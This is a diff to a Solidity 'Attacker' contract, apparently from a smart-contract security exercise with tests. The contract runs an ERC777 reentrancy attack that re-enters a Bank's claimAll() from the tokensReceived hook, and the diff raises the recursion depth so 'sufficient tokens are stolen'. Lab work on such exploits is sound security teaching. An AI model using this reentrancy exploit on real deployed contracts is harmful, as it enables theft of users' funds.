@@ -12,7 +12,7 @@ contract Attacker is AccessControl, IERC777Recipient {
     bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
     
     uint8 depth = 0;
-    uint8 max_depth = 2; // Limit the recursion depth to avoid stack too deep errors
+    uint8 max_depth = 10; // Increased recursion depth to ensure sufficient tokens are stolen
 
     Bank public bank; 
 
@@ -28,9 +28,6 @@ contract Attacker is AccessControl, IERC777Recipient {
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
         bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        // Granting ATTACKER_ROLE to the token is only necessary if the attacker
-        // contract needs to interact with the token in a privileged way, 
-        // which it doesn't here, but keeping it for completeness based on original skeleton.
         _grantRole(ATTACKER_ROLE, bank.token().address ); 
     }
 
@@ -49,11 +46,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 
     /*
        Withdraws a specific amount of stolen ERC777 tokens.
-       FIXED: Adjusted signature to match the test's expectation (address recipient, uint256 amt)
+       FIXED: Function signature now matches the test: withdraw(address recipient, uint256 amt)
     */
     function withdraw(address recipient, uint256 amt) public onlyRole(ATTACKER_ROLE) {
         ERC777 token = bank.token();
-        // Use token.send() to transfer the requested amount
         token.send(recipient, amt, "");
     }
 
@@ -68,16 +64,11 @@ contract Attacker is AccessControl, IERC777Recipient {
         bytes calldata userData,
         bytes calldata operatorData
     ) external {
-        // Re-enter the Bank if:
-        // 1. The call came from the correct token (security check).
-        // 2. The recursion depth is below the limit.
         if (msg.sender == bank.token() && depth < max_depth) {
             depth++;
             emit Recurse(depth);
             
             // Re-enter the vulnerable function.
-            // Since balances[msg.sender] has not been set to 0 yet, 
-            // this call will succeed, minting more tokens to the Attacker.
             bank.claimAll();
             
             depth--;
